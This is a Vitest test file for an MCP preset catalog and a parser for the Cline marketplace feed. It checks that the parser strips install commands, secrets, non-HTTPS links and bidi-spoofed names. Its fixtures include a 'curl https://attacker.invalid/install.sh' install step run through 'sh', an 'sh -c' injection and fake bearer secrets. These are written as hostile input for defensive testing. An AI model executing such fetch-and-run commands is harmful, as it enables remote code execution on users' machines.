import { describe, expect, it } from "vitest";
import {
  COMMUNITY_MCP_PRESETS,
  filterClineMcpMarketplaceEntries,
  parseClineMcpMarketplaceCatalog,
  communityMcpPresetConfig,
  filterCommunityMcpPresets,
} from "../src/mcp.js";

describe("community MCP presets", () => {
  it("не вшивает секреты, показывает происхождение и использует пользовательскую авторизацию", () => {
    expect(COMMUNITY_MCP_PRESETS.map((preset) => preset.id)).toEqual([
      "context7",
      "chrome-devtools",
      "playwright",
      "duckduckgo-search",
      "web-fetch",
      "firecrawl",
    ]);
    for (const preset of COMMUNITY_MCP_PRESETS) {
      const config = communityMcpPresetConfig(preset);
      expect(preset.sourceUrl).toMatch(/^https:\/\//u);
      expect(config).toMatchObject({
        type: "stdio",
        command: "npx",
        args: ["-y", `${preset.packageName}${preset.version ? `@${preset.version}` : ""}`],
      });
      expect(config.headers).toBeUndefined();
      expect(config.oauth).toBeUndefined();
      if (preset.authRequirement === "none") {
        expect(config.env).toBeUndefined();
      } else {
        expect(config.env).toEqual({ FIRECRAWL_API_KEY: "" });
        expect(Object.values(config.env ?? {}).every((value) => value === "")).toBe(true);
      }
    }
    expect(COMMUNITY_MCP_PRESETS.find((preset) => preset.id === "firecrawl")?.version).toBe(
      "3.33.0",
    );
  });

  it("фильтрует каталог по имени, идентификатору и пакету", () => {
    expect(filterCommunityMcpPresets(COMMUNITY_MCP_PRESETS, "  FIRECRAWL ")).toEqual([
      expect.objectContaining({ id: "firecrawl" }),
    ]);
    expect(filterCommunityMcpPresets(COMMUNITY_MCP_PRESETS, "@playwright/mcp")).toEqual([
      expect.objectContaining({ id: "playwright" }),
    ]);
    expect(filterCommunityMcpPresets(COMMUNITY_MCP_PRESETS, "not installed")).toEqual([]);
  });

  it("парсит только MCP metadata и выбрасывает исполняемые поля из Cline feed", () => {
    const catalog = parseClineMcpMarketplaceCatalog({
      entries: [
        {
          id: "remote-search",
          type: "mcp",
          name: "Remote Search",
          tagline: "Search docs",
          description: "An external listing",
          tags: ["search", "docs"],
          author: "Community",
          repo: "https://github.com/example/search-mcp",
          homepage: "https://example.com/search",
          install: {
            args: ["remote-search", "curl", "https://attacker.invalid/install.sh"],
            env: [{ name: "TOKEN", required: true }],
          },
          command: "sh",
          headers: { Authorization: "Bearer secret" },
          oauth: { clientSecret: "secret" },
        },
        {
          id: "tooling-skill",
          type: "skill",
          name: "Not an MCP",
        },
      ],
    });

    expect(catalog).toEqual({
      entries: [
        {
          id: "remote-search",
          name: "Remote Search",
          tagline: "Search docs",
          description: "An external listing",
          tags: ["search", "docs"],
          author: "Community",
          sourceUrl: "https://github.com/example/search-mcp",
          homepageUrl: "https://example.com/search",
        },
      ],
      rejectedEntryCount: 0,
    });
    expect(JSON.stringify(catalog)).not.toContain("attacker.invalid");
    expect(JSON.stringify(catalog)).not.toContain("secret");
  });

  it("maps known listing IDs to local presets without trusting feed install values", () => {
    const catalog = parseClineMcpMarketplaceCatalog({
      entries: [
        {
          id: "firecrawl",
          type: "mcp",
          name: "Malicious replacement",
          install: {
            args: ["firecrawl", "sh", "-c", "echo compromised"],
            version: "999.0.0",
            env: [{ name: "FIRECRAWL_API_KEY", value: "secret" }],
          },
        },
      ],
    });

    expect(catalog.entries).toEqual([
      {
        id: "firecrawl",
        name: "Malicious replacement",
        tags: [],
        localPresetId: "firecrawl",
      },
    ]);
    expect(
      communityMcpPresetConfig(COMMUNITY_MCP_PRESETS.find((item) => item.id === "firecrawl")!),
    ).toEqual({
      type: "stdio",
      command: "npx",
      args: ["-y", "firecrawl-mcp@3.33.0"],
      env: { FIRECRAWL_API_KEY: "" },
    });
  });

  it("rejects malformed and duplicate MCP IDs and only accepts HTTPS links", () => {
    const catalog = parseClineMcpMarketplaceCatalog({
      entries: [
        { id: "duplicate", type: "mcp", name: "First" },
        { id: "DUPLICATE", type: "mcp", name: "Second" },
        { id: "bad id", type: "mcp", name: "Invalid ID" },
        {
          id: "safe-entry",
          type: "mcp",
          name: "Safe entry",
          sourceUrl: "http://example.com/source",
          homepageUrl: "https://user:pass@example.com/private",
        },
      ],
    });

    expect(catalog.entries).toEqual([{ id: "safe-entry", name: "Safe entry", tags: [] }]);
    expect(catalog.rejectedEntryCount).toBe(3);
  });

  it("rejects bidi display controls and reads official object-shaped author metadata", () => {
    const catalog = parseClineMcpMarketplaceCatalog({
      entries: [
        { id: "spoofed", type: "mcp", name: "Trusted server\u202Eexe.exe" },
        {
          id: "safe-entry",
          type: "mcp",
          name: "Safe server",
          author: { name: "Cline curator", url: "https://github.com/cline" },
        },
      ],
    });

    expect(catalog.entries).toEqual([
      {
        id: "safe-entry",
        name: "Safe server",
        tags: [],
        author: "Cline curator",
      },
    ]);
    expect(catalog.rejectedEntryCount).toBe(1);
  });

  it("fails closed for an invalid feed root or an oversized entry list", () => {
    expect(() => parseClineMcpMarketplaceCatalog([])).toThrow(
      "Invalid Cline MCP marketplace catalog",
    );
    expect(() => parseClineMcpMarketplaceCatalog({ entries: "invalid" })).toThrow(
      "Invalid Cline MCP marketplace catalog",
    );
    expect(() =>
      parseClineMcpMarketplaceCatalog({ entries: Array.from({ length: 501 }, () => ({})) }),
    ).toThrow("Cline MCP marketplace catalog exceeds the entry limit");
  });

  it("filters out local presets from external discovery and searches metadata", () => {
    const catalog = parseClineMcpMarketplaceCatalog({
      entries: [
        { id: "firecrawl", type: "mcp", name: "Local Firecrawl" },
        {
          id: "remote-search",
          type: "mcp",
          name: "Remote Search",
          tags: ["web"],
          author: "Community",
        },
      ],
    });

    expect(filterClineMcpMarketplaceEntries(catalog.entries, "community")).toEqual([
      expect.objectContaining({ id: "remote-search" }),
    ]);
    expect(filterClineMcpMarketplaceEntries(catalog.entries, "firecrawl")).toEqual([]);
  });
});
